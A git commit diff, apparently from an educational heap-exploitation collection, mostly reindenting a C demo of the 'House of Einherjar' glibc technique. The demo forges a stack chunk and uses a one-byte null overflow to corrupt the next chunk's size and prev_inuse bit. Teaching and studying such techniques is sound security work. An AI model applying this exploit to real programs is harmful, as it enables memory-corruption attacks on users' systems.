1ce0fb4146d82922715820065005a84a89f59709
Grazfather <grazfather@gmail.com>
2017-05-30 11:02:45 -0700

    fixme fix einharjar

--- house_of_einherjar.c
+++ house_of_einherjar.c
@@ -7,29 +7,28 @@
 /*
    Credit to st4g3r for publishing this technique
    The House of Enherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
-   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
 */
 
 int main()
 {
-	printf("Welcome to House of Einherjar!\n");
-	printf("Tested in Ubuntu 16.04 64bit.\n");
-	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
+    printf("Welcome to House of Einherjar!\n");
+    printf("Tested in Ubuntu 16.04 64bit.\n");
+    printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
 
-	uint8_t* a;
-	uint8_t* b;
-	uint8_t* c;
-	uint8_t* d;
+    uint8_t* a;
+    uint8_t* b;
+    uint8_t* c;
+    uint8_t* d;
 
-	printf("\nWe allocate 0x38 bytes for 'a'\n");
-	a = (uint8_t*) malloc(0x38);
-	printf("a: %p\n", a);
-    
+    printf("\nWe allocate 0x38 bytes for 'a'\n");
+    a = (uint8_t*) malloc(0x38);
+    printf("a: %p\n", a);
+
     int real_a_size = malloc_usable_size(a);
     printf("Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);
 
     // create a fake chunk
-    printf("\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
+	printf("\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
     printf("However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
     printf("We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
     printf("(although we could do the unsafe unlink technique here in some scenarios)\n");
@@ -47,27 +46,27 @@ int main()
     printf("fwd: %#lx\n", fake_chunk[2]);
     printf("bck: %#lx\n", fake_chunk[3]);
 
-	/* In this case it is easier if the chunk size attribute has a least significant byte with
-	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
-	 * the chunk includes the amount requested plus some amount required for the metadata. */
-	b = (uint8_t*) malloc(0xf8);
+    /* In this case it is easier if the chunk size attribute has a least significant byte with
+     * a value of 0x00. The least significant byte of this will be 0x00, because the size of
+     * the chunk includes the amount requested plus some amount required for the metadata. */
+    b = (uint8_t*) malloc(0xf8);
     int real_b_size = malloc_usable_size(b);
 
-	printf("\nWe allocate 0xf8 bytes for 'b'.\n");
-	printf("b: %p\n", b);
+    printf("\nWe allocate 0xf8 bytes for 'b'.\n");
+    printf("b: %p\n", b);
 
     printf("We allocate a 3rd chunk to make sure we don't touch the wilderness (not necessary)\n");
     c = malloc(0x60);
-	printf("c: %p\n", c);
+    printf("c: %p\n", c);
 
-	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
     /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/
+    uint64_t* b_size_ptr = (uint64_t*)(b - 8);
 
-	printf("\nb.size: %#lx\n", *b_size_ptr);
-	printf("b.size is: (0x100) | prev_inuse = 0x101\n");
-	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
-	a[real_a_size] = 0; 
-	printf("b.size: %#lx\n", *b_size_ptr);
+    printf("\nb.size: %#lx\n", *b_size_ptr);
+    printf("b.size is: (0x100) | prev_inuse = 0x101\n");
+    printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
+    a[real_a_size] = 0;
+    printf("b.size: %#lx\n", *b_size_ptr);
     printf("This is easiest if b.size is a multiple of 0x100 so you "
            "don't change the size of b, only its prev_inuse bit\n");
     printf("If it had been modified, we would need a fake chunk inside "
